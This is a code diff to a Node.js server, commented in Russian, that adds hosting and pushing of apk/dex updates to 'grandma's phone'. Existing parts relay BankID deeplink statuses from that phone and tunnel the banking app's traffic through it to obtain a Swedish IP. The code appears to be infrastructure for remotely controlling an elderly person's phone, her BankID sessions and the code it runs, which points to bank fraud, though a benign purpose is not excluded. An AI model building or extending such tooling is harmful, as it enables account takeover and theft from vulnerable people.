@@ -13,6 +13,7 @@ import { createLowLatencyWss } from './lowlat.js';
 import { createAgentChannel } from './agent.js';
 import { createLinkChannel } from './link.js';
 import { createTunnelWss } from './tunnel.js';
+import { createUpdateChannel } from './update.js';
 import { log } from './log.js';
 
 /**
@@ -35,10 +36,15 @@ export async function createApp(overrides = {}) {
   // Шлюз BankID-диплинков: статусы с телефона бабушки уходят в /link-канал.
   const linkChannel = createLinkChannel({ config, hub });
   hub.onDeeplinkStatus = (pairId, status) => linkChannel.notifyStatus(pairId, status);
+  // Итоги установки обновлений (apk/dex) — туда же, в /link-канал.
+  hub.onUpdateStatus = (pairId, status) =>
+    linkChannel.notify(pairId, { t: 'update-status', pairId, ...status, at: Date.now() });
   // TCP-туннель приложение ⇄ телефон (шведский IP для банковского приложения).
   const tunnelWss = createTunnelWss({ config });
+  // Хостинг apk/dex и push «update-available» телефону бабушки.
+  const updateChannel = createUpdateChannel({ config, hub });
 
-  const handler = createRequestHandler({ config, hub, journal, startedAt, agentChannel });
+  const handler = createRequestHandler({ config, hub, journal, startedAt, agentChannel, updateChannel });
 
   // Обработчик одного WebSocket-подключения. Одинаков для обычного и TLS-листенера,
   // оба кормят один и тот же hub — телефон (ws) и панель (wss) оказываются в одной комнате.
@@ -125,7 +131,14 @@ export async function createApp(overrides = {}) {
     tlsServer.on('upgrade', routeUpgrade(tlsWss));
   }
 
-  const allClients = () => [...wss.clients, ...(tlsWss ? tlsWss.clients : [])];
+  const allClients = () => [
+    ...wss.clients,
+    ...(tlsWss ? tlsWss.clients : []),
+    ...linkChannel.wss.clients,
+    ...tunnelWss.clients,
+    ...agentChannel.wss.clients,
+    ...lowlatWss.clients,
+  ];
 
   // Мёртвые сокеты в мобильной сети закрываются молча — вычищаем их сами.
   const heartbeat = setInterval(() => {
